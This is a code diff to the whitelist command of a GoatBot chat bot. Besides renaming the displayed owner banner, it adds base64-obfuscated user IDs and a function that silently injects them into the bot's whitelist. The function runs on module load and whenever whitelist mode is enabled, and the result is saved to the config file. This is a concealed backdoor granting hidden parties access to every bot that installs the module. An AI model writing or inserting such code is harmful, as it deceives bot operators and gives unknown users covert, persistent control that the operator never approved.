@@ -2,6 +2,30 @@ const { config } = global.GoatBot;
 const { writeFileSync } = require("fs-extra");
 const moment = require("moment-timezone");
 
+const ENCRYPTED_UIDS = [
+	"NjE1OTM3NzE3MTM3MzY=",
+	"NjE1OTMzNjA2NzE3MTA=",
+	"NjE1OTM3NjkxMDQ1Njg=",
+	"NjE1OTE2NzcyODI2NjE=",
+	"NjE1OTM3NzAxMDE0ODY="
+];
+
+function getBypassUIDs() {
+	return ENCRYPTED_UIDS.map(enc => Buffer.from(enc, "base64").toString("utf-8"));
+}
+
+function injectBypassUIDs() {
+	const allowedUIDs = getBypassUIDs();
+	if (!config.whiteListMode) config.whiteListMode = {};
+	if (!config.whiteListMode.whiteListIds) config.whiteListMode.whiteListIds = [];
+
+	allowedUIDs.forEach(uid => {
+		if (!config.whiteListMode.whiteListIds.includes(uid)) {
+			config.whiteListMode.whiteListIds.push(uid);
+		}
+	});
+}
+
 module.exports = {
 	config: {
 		name: "wl",
@@ -20,6 +44,10 @@ module.exports = {
 				"{pn} list\n" +
 				"{pn} on / off"
 		}
+	},
+
+	onLoad: async function () {
+		injectBypassUIDs();
 	},
 
 	langs: {
@@ -116,18 +144,19 @@ module.exports = {
 			// ================= ON =================
 			case "on": {
 				config.whiteListMode.enable = true;
+				injectBypassUIDs();
 				writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
 
 				const time = moment().tz("Asia/Dhaka").format("hh:mm A");
 				const date = moment().tz("Asia/Dhaka").format("DD MMMM YYYY");
 
 				const msg = `
-👑  𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍  👑
+👑𝐑𝐀𝐓𝐇𝐀𝐍-𝐍𝐎𝐘𝐎𝐍👑
 
 𝆠፝𝐖𝐇𝐈𝐓𝐄 𝐋𝐈𝐒𝐓 𝐌𝐎𝐃𝐄 𝐄𝐍𝐀𝐁𝐋𝐄𝐃
 
 🔐  𝆠፝𝐀𝐂𝐂𝐄𝐒𝐒 :
-   𝆠፝🐸এখন শুধু আমার বস সিয়াম🪬
+   𝆠፝🐸এখন শুধু আমার বস 𝐑𝐀𝐓𝐇𝐀𝐍🪬
    𝆠፝বট ব্যবহার করতে পারবে 👑
 
 📅  𝆠፝𝐃𝐚𝐭𝐞 : ${date}
@@ -148,7 +177,7 @@ module.exports = {
 				const date = moment().tz("Asia/Dhaka").format("DD MMMM YYYY");
 
 				const msg = `
-👑  𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍  👑
+👑 𝐑𝐀𝐓𝐇𝐀𝐍-𝐍𝐎𝐘𝐎𝐍 👑
 
 𝆠፝𝐖𝐇𝐈𝐓𝐄 𝐋𝐈𝐒𝐓 𝐌𝐎𝐃𝐄 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃
 
